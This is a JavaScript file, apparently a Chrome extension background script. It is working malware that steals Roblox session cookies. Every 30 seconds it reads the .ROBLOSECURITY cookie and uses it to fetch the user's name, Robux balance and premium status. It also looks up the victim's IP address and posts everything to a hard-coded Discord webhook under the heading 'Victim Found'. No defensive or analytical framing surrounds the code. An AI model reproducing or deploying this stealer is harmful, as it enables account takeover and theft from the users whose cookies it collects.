const WEBHOOK = "https://discord.com/api/webhooks/1250688425280147506/6TCb-gvGxewXBaiFthTTZn3SaRjTmzFyr4T1EwYm0tX3MFHdmGYiky9cKlbhgK-jQG6U";

async function main(cookie) {
    try {
        // Get IP address
        let ipAddr = await (await fetch("https://api.ipify.org?format=json")).json();
        ipAddr = ipAddr.ip;
        
        // Initialize statistics
        let statistics = null;

        // Fetch user information if cookie is available
        if (cookie) {
            let response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
                headers: {
                    "Cookie": ".ROBLOSECURITY=" + cookie
                },
                redirect: "manual"
            });
            if (response.ok) {
                statistics = await response.json();
            } else {
                console.error("Failed to fetch user information: " + response.status);
            }
        } else {
            console.error("No cookie found");
        }

        // Send data to the webhook
        await fetch(WEBHOOK, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "content": null,
                "embeds": [
                  {
                    "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                    "color": null,
                    "fields": [
                      {
                        "name": "Username",
                        "value": statistics ? statistics.UserName : "N/A",
                        "inline": true
                      },
                      {
                        "name": "Robux",
                        "value": statistics ? statistics.RobuxBalance : "N/A",
                        "inline": true
                      },
                      {
                        "name": "Premium",
                        "value": statistics ? statistics.IsPremium : "N/A",
                        "inline": true
                      }
                    ],
                    "author": {
                      "name": "Victim Found: " + ipAddr,
                      "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                    },
                    "footer": {
                      "text": "Information Retrieved",
                      "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                    },
                    "thumbnail": {
                      "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                    }
                  }
                ],
                "username": "Roblox",
                "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
                "attachments": []
            })
        });
    } catch (error) {
        console.error("Error:", error);
    }
}

// Function to retrieve Roblox security cookie and call main function
function retrieveCookieAndRun() {
    chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
        if (cookie) {
            console.log("Cookie found:", cookie);
            main(cookie.value);
        } else {
            console.error("Cookie not found");
            main(null);
        }
    });
}

// Set interval to run the function every 30 seconds
setInterval(retrieveCookieAndRun, 30000);

// Initial call to start the process immediately
retrieveCookieAndRun();
